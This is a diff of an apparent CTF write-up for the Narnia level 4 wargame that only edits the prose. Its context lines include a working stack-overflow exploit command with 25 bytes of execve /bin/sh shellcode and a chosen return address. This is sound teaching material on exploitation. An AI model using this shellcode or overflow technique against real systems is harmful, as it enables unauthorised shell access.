@@ -75,9 +75,9 @@ Program received signal SIGSEGV, Segmentation fault.
 0xffffd8e0: 0x00000000  0x00000000  0x00000000  0x00000000
 {% endhighlight %}
 
-<p>From this we know that I have somewhere around 272 bytes for the shellcode with some additional bytes that will overwrite the return address. Now we can construct the command, using code from the previous levels. </p>
+<p>From this we know that we have somewhere around 272 bytes for the shellcode with some additional bytes that will overwrite the return address. Now we can construct the command, using code from the previous levels. </p>
 
-<p>As we know already that our payload is 25 bytes in size, we will have to firstly write 247 "A" letters, then 25 bytes of shellcode and lastly overwriting the <b>EIP register</b>, which then will be placed somewhere in the middle of "A" letters. By looking at the debug of the memory, I'm going to choose it as <b>0xffffd850</b>.  </p>
+<p>As we already know that our payload is 25 bytes in size, we will have to: firstly write 247 "A" letters, then 25 bytes of shellcode and lastly overwriting the <b>EIP register</b>, which then will be placed somewhere in the middle of "A" letters. By looking at the debug of the memory, I'm going to choose it as <b>0xffffd850</b>.  </p>
 
 {% highlight bash %}
 narnia4@melinda:/narnia$ ./narnia4 $(python -c'print "A" * 247 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
